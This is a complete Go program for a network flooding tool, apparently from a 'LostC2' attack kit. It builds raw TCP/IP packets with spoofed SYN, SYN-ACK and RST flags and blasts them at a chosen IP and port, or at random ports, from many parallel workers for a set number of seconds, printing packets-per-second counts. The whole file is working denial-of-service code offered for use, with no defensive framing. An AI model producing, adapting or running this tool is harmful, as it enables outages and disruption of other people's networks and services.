package main

import (
    "encoding/binary"
    "fmt"
    "math/rand"
    "net"
    "os"
    "runtime"
    "strconv"
    "strings"
    "sync"
    "sync/atomic"
    "syscall"
    "time"
)

// TCP flags
const (
    FIN = 1 << 0
    SYN = 1 << 1
    RST = 1 << 2
    PSH = 1 << 3
    ACK = 1 << 4
    URG = 1 << 5
    ECE = 1 << 6
    CWR = 1 << 7
)

// TCP Options
const (
    TCPOPT_EOL        = 0
    TCPOPT_NOP        = 1
    TCPOPT_MSS        = 2
    TCPOPT_WINDOW     = 3
    TCPOPT_SACK       = 4
    TCPOPT_TIMESTAMP  = 8
    TCPOPT_MD5SIG     = 19
    TCPOPT_MPTCP      = 30
    TCPOPT_FASTOPEN   = 34
    TCPOPT_EXP        = 254
)

type AttackStats struct {
    packets     uint64
    connections uint64
    start       time.Time
}

var (
    stats   AttackStats
    running uint32
)

// Raw socket creation
func createRawSocket() (int, error) {
    fd, err := syscall.Socket(syscall.AF_INET, syscall.SOCK_RAW, syscall.IPPROTO_TCP)
    if err != nil {
        return -1, err
    }
    
    // Set IP_HDRINCL to 1 so we can craft our own IP headers
    err = syscall.SetsockoptInt(fd, syscall.IPPROTO_IP, syscall.IP_HDRINCL, 1)
    if err != nil {
        syscall.Close(fd)
        return -1, err
    }
    
    return fd, nil
}

// Calculate IP checksum
func ipChecksum(data []byte) uint16 {
    var sum uint32
    length := len(data)
    
    for i := 0; i < length-1; i += 2 {
        sum += uint32(data[i])<<8 | uint32(data[i+1])
    }
    
    if length%2 != 0 {
        sum += uint32(data[length-1]) << 8
    }
    
    for sum>>16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16)
    }
    
    return uint16(^sum)
}

// Calculate TCP checksum
func tcpChecksum(srcIP, dstIP net.IP, tcpHeader []byte) uint16 {
    pseudoHeader := make([]byte, 12)
    
    // Source IP
    copy(pseudoHeader[0:4], srcIP.To4())
    // Destination IP
    copy(pseudoHeader[4:8], dstIP.To4())
    // Zero
    pseudoHeader[8] = 0
    // Protocol
    pseudoHeader[9] = syscall.IPPROTO_TCP
    // TCP length
    length := uint16(len(tcpHeader))
    pseudoHeader[10] = byte(length >> 8)
    pseudoHeader[11] = byte(length)
    
    // Calculate checksum of pseudo header + tcp header
    data := append(pseudoHeader, tcpHeader...)
    
    var sum uint32
    for i := 0; i < len(data); i += 2 {
        if i+1 < len(data) {
            sum += uint32(data[i])<<8 | uint32(data[i+1])
        } else {
            sum += uint32(data[i]) << 8
        }
    }
    
    for sum>>16 != 0 {
        sum = (sum & 0xFFFF) + (sum >> 16)
    }
    
    return uint16(^sum)
}

// Generate TCP options - FIXED VERSION
func generateTCPOptions() []byte {
    options := make([]byte, 0, 40)
    
    // MSS (4 bytes)
    options = append(options, TCPOPT_MSS, 4, 0x05, 0xB4)
    
    // NOP + Window Scale (3 bytes)
    options = append(options, TCPOPT_NOP, TCPOPT_WINDOW, 3, 7)
    
    // NOP + SACK Permitted (2 bytes)
    options = append(options, TCPOPT_NOP, TCPOPT_SACK, 2)
    
    // NOP + Timestamp (10 bytes)
    options = append(options, TCPOPT_NOP, TCPOPT_TIMESTAMP, 10)
    
    // Add timestamp value
    tsVal := make([]byte, 8)
    binary.BigEndian.PutUint32(tsVal[0:4], uint32(time.Now().UnixNano()/1000000000))
    binary.BigEndian.PutUint32(tsVal[4:8], 0)
    options = append(options, tsVal...)
    
    // Pad to 4-byte boundary
    for len(options)%4 != 0 {
        options = append(options, TCPOPT_NOP)
    }
    
    return options
}

// Create TCP packet
func createTCPPacket(srcIP, dstIP net.IP, srcPort, dstPort uint16, seq, ack uint32, flags uint8, window uint16, options []byte) []byte {
    // IP Header (20 bytes)
    ipHeader := make([]byte, 20)
    
    // Version + IHL
    ipHeader[0] = 0x45
    // TOS
    ipHeader[1] = 0
    // Total Length (set later)
    ipHeader[2] = 0
    ipHeader[3] = 0
    // Identification
    binary.BigEndian.PutUint16(ipHeader[4:6], uint16(rand.Intn(65535)))
    // Flags + Fragment Offset
    ipHeader[6] = 0x40 // Don't fragment
    ipHeader[7] = 0
    // TTL
    ipHeader[8] = 64
    // Protocol (TCP)
    ipHeader[9] = syscall.IPPROTO_TCP
    // Checksum (0 for now)
    ipHeader[10] = 0
    ipHeader[11] = 0
    // Source IP
    copy(ipHeader[12:16], srcIP.To4())
    // Destination IP
    copy(ipHeader[16:20], dstIP.To4())
    
    // TCP Header
    dataOffset := (20 + len(options)) / 4
    tcpHeader := make([]byte, 20+len(options))
    
    // Source Port
    binary.BigEndian.PutUint16(tcpHeader[0:2], srcPort)
    // Destination Port
    binary.BigEndian.PutUint16(tcpHeader[2:4], dstPort)
    // Sequence Number
    binary.BigEndian.PutUint32(tcpHeader[4:8], seq)
    // Acknowledgement Number
    binary.BigEndian.PutUint32(tcpHeader[8:12], ack)
    // Data Offset
    tcpHeader[12] = byte(dataOffset << 4)
    // Flags
    tcpHeader[13] = flags
    // Window
    binary.BigEndian.PutUint16(tcpHeader[14:16], window)
    // Checksum (0 for now)
    tcpHeader[16] = 0
    tcpHeader[17] = 0
    // Urgent Pointer
    tcpHeader[18] = 0
    tcpHeader[19] = 0
    
    // Copy options
    if len(options) > 0 {
        copy(tcpHeader[20:], options)
    }
    
    // Calculate TCP checksum
    checksum := tcpChecksum(srcIP, dstIP, tcpHeader)
    binary.BigEndian.PutUint16(tcpHeader[16:18], checksum)
    
    // Calculate IP total length and checksum
    totalLength := len(ipHeader) + len(tcpHeader)
    binary.BigEndian.PutUint16(ipHeader[2:4], uint16(totalLength))
    ipCheck := ipChecksum(ipHeader)
    binary.BigEndian.PutUint16(ipHeader[10:12], ipCheck)
    
    // Combine headers
    packet := make([]byte, totalLength)
    copy(packet, ipHeader)
    copy(packet[len(ipHeader):], tcpHeader)
    
    return packet
}

// Get local IP address
func getLocalIP() (net.IP, error) {
    addrs, err := net.InterfaceAddrs()
    if err != nil {
        return nil, err
    }
    
    for _, addr := range addrs {
        if ipnet, ok := addr.(*net.IPNet); ok && !ipnet.IP.IsLoopback() {
            if ipnet.IP.To4() != nil {
                return ipnet.IP, nil
            }
        }
    }
    
    return net.ParseIP("127.0.0.1"), nil
}

// Simple packet sender - optimized for speed
func sendPackets(fd int, dstIP net.IP, dstPort uint16, workerID int, randomPorts bool) {
    // Get local IP
    localIP, err := getLocalIP()
    if err != nil {
        fmt.Printf("Worker %d: Failed to get local IP: %v\n", workerID, err)
        return
    }
    
    dstAddr := &syscall.SockaddrInet4{
        Port: 0,
        Addr: [4]byte{dstIP[0], dstIP[1], dstIP[2], dstIP[3]},
    }
    
    packetCount := uint64(0)
    for atomic.LoadUint32(&running) == 1 {
        // Generate random source port
        srcPort := uint16(1024 + rand.Intn(64512))
        
        // Generate target port
        targetPort := dstPort
        if randomPorts {
            targetPort = uint16(1 + rand.Intn(65534))
        }
        
        // Generate TCP options
        options := generateTCPOptions()
        
        // Generate random sequence numbers
        seq := rand.Uint32()
        ack := rand.Uint32()
        
        // Random window size
        window := uint16(1024 + rand.Intn(64512))
        
        // 1. Send SYN packet (first step of 3-way handshake)
        synPacket := createTCPPacket(localIP, dstIP, srcPort, targetPort, seq, 0, SYN, window, options)
        err := syscall.Sendto(fd, synPacket, 0, dstAddr)
        if err != nil && packetCount%1000 == 0 {
            // Only log occasional errors
        } else if err == nil {
            atomic.AddUint64(&stats.packets, 1)
        }
        
        // 2. Send SYN-ACK packet (second step - spoofed response)
        synAckPacket := createTCPPacket(dstIP, localIP, targetPort, srcPort, ack, seq+1, SYN|ACK, window, options)
        syscall.Sendto(fd, synAckPacket, 0, dstAddr)
        atomic.AddUint64(&stats.packets, 1)
        
        // 3. Send RST packet (third step - kill connection)
        rstPacket := createTCPPacket(localIP, dstIP, srcPort, targetPort, seq+1, ack+1, RST, window, options)
        syscall.Sendto(fd, rstPacket, 0, dstAddr)
        atomic.AddUint64(&stats.packets, 1)
        
        // 4. Send additional RST from server side
        rstPacket2 := createTCPPacket(dstIP, localIP, targetPort, srcPort, ack+1, seq+1, RST, window, options)
        syscall.Sendto(fd, rstPacket2, 0, dstAddr)
        atomic.AddUint64(&stats.packets, 1)
        
        // Count this as one connection attempt
        atomic.AddUint64(&stats.connections, 1)
        
        packetCount++
        
        // Yield occasionally to prevent starvation
        if packetCount%1000 == 0 {
            runtime.Gosched()
        }
    }
}

// Attack worker
func attackWorker(dstIP net.IP, dstPort uint16, workerID int, randomPorts bool) {
    fd, err := createRawSocket()
    if err != nil {
        fmt.Printf("Worker %d: Failed to create raw socket: %v\n", workerID, err)
        return
    }
    defer syscall.Close(fd)
    
    // Set socket options for maximum performance
    syscall.SetsockoptInt(fd, syscall.SOL_SOCKET, syscall.SO_SNDBUF, 65535)
    
    sendPackets(fd, dstIP, dstPort, workerID, randomPorts)
}

func displayStats() {
    ticker := time.NewTicker(2 * time.Second)
    defer ticker.Stop()
    
    for atomic.LoadUint32(&running) == 1 {
        <-ticker.C
        elapsed := time.Since(stats.start)
        packets := atomic.LoadUint64(&stats.packets)
        cons := atomic.LoadUint64(&stats.connections)
        
        pps := 0.0
        if elapsed.Seconds() > 0 {
            pps = float64(packets) / elapsed.Seconds()
        }
        
        fmt.Printf("\rSending attack...... [%v] | Packets: %d | Connections: %d | PPS: %.0f",
            elapsed.Truncate(time.Second), packets, cons, pps)
    }
}

func displayFinalStats() {
    elapsed := time.Since(stats.start)
    packets := atomic.LoadUint64(&stats.packets)
    cons := atomic.LoadUint64(&stats.connections)
    
    fmt.Println("\n" + strings.Repeat("=", 60))
    fmt.Printf("Sent Attack......\n")
    fmt.Println(strings.Repeat("-", 60))
    fmt.Printf("LostC2 TCPkill method sent.\n")
    fmt.Printf("{cons: %d}, {packets: %d}, {time: %v}\n", cons, packets, elapsed.Truncate(time.Second))
    
    if elapsed.Seconds() > 0 {
        fmt.Printf("Average PPS: %.0f\n", float64(packets)/elapsed.Seconds())
        fmt.Printf("Connections/second: %.0f\n", float64(cons)/elapsed.Seconds())
    }
    
    fmt.Println(strings.Repeat("=", 60))
}

func main() {
    // Check for root
    if os.Geteuid() != 0 {
        fmt.Println("Error: This program requires root privileges")
        os.Exit(1)
    }
    
    if len(os.Args) != 4 {
        fmt.Println("Usage: sudo ./tcpkill <ip> <port> <time>")
        fmt.Println("Example: sudo ./tcpkill 192.168.1.1 80 60")
        fmt.Println("Use port 0 for randomized port flood")
        os.Exit(1)
    }
    
    targetIP := os.Args[1]
    targetPortStr := os.Args[2]
    durationStr := os.Args[3]
    
    // Parse IP
    ip := net.ParseIP(targetIP)
    if ip == nil || ip.To4() == nil {
        fmt.Printf("Invalid IPv4 address: %s\n", targetIP)
        os.Exit(1)
    }
    
    // Parse duration
    duration, err := strconv.Atoi(durationStr)
    if err != nil || duration <= 0 {
        fmt.Printf("Invalid duration: %s\n", durationStr)
        os.Exit(1)
    }
    
    // Parse port
    var targetPort int
    var randomPorts bool
    if targetPortStr == "0" {
        randomPorts = true
        targetPort = 80 // Default, but will be randomized
        fmt.Println("Randomized port mode enabled")
    } else {
        targetPort, err = strconv.Atoi(targetPortStr)
        if err != nil || targetPort < 1 || targetPort > 65535 {
            fmt.Printf("Invalid port: %s\n", targetPortStr)
            os.Exit(1)
        }
        randomPorts = false
    }
    
    // Seed random
    rand.Seed(time.Now().UnixNano())
    
    // Set GOMAXPROCS to use all CPUs
    runtime.GOMAXPROCS(runtime.NumCPU())
    
    // Initialize
    atomic.StoreUint32(&running, 1)
    stats.start = time.Now()
    
    // Banner
    fmt.Println(strings.Repeat("=", 60))
    fmt.Println("LostC2 TCPkill Method - Advanced 3-Way RST Flood")
    fmt.Println(strings.Repeat("=", 60))
    fmt.Printf("Target: %s\n", targetIP)
    if randomPorts {
        fmt.Println("Ports: Randomized (1-65535)")
    } else {
        fmt.Printf("Port: %d\n", targetPort)
    }
    fmt.Printf("Duration: %d seconds\n", duration)
    fmt.Printf("Using all %d CPU cores\n", runtime.NumCPU())
    fmt.Println(strings.Repeat("=", 60))
    fmt.Println("Sending attack......")
    fmt.Println(strings.Repeat("-", 60))
    
    // Start workers - use optimal number based on CPU cores
    numWorkers := runtime.NumCPU() * 2
    if numWorkers > 16 {
        numWorkers = 16
    }
    
    fmt.Printf("Starting %d high-speed workers...\n", numWorkers)
    
    var wg sync.WaitGroup
    for i := 0; i < numWorkers; i++ {
        wg.Add(1)
        go func(workerID int) {
            defer wg.Done()
            attackWorker(ip, uint16(targetPort), workerID, randomPorts)
        }(i)
    }
    
    // Stats display
    go displayStats()
    
    // Timer
    time.AfterFunc(time.Duration(duration)*time.Second, func() {
        atomic.StoreUint32(&running, 0)
    })
    
    // Wait for workers
    wg.Wait()
    
    // Final stats
    displayFinalStats()
}
